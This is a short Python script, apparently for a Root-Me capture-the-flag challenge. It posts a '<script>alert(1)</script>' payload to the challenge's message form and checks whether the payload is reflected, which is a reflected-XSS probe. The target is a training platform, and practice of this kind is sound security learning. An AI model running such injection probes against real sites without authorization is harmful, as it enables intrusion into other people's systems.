import httpx
import asyncio

async def debug_root_me():
    url = "http://challenge01.root-me.org/web-client/ch18/index.php"
    payload = "<script>alert(1)</script>"
    data = {
        "titre": "test",
        "message": payload
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    async with httpx.AsyncClient() as client:
        print(f"Testing POST to {url} with payload in 'message'...")
        resp = await client.post(url, data=data, headers=headers)
        print(f"Status: {resp.status_code}")
        # print(f"Body snippet: {resp.text[:500]}")
        if payload in resp.text:
            print("SUCCESS: Payload reflected!")
        else:
            print("FAILURE: Payload NOT reflected.")
            # Let's see what's in the response
            if "titre" in resp.text.lower():
                 print("Found 'titre' in response, maybe look for the input values.")
                 # Find where the message might be
                 start = resp.text.find("test")
                 if start != -1:
                     print(f"Context: {resp.text[start-50:start+150]}")

if __name__ == "__main__":
    asyncio.run(debug_root_me())
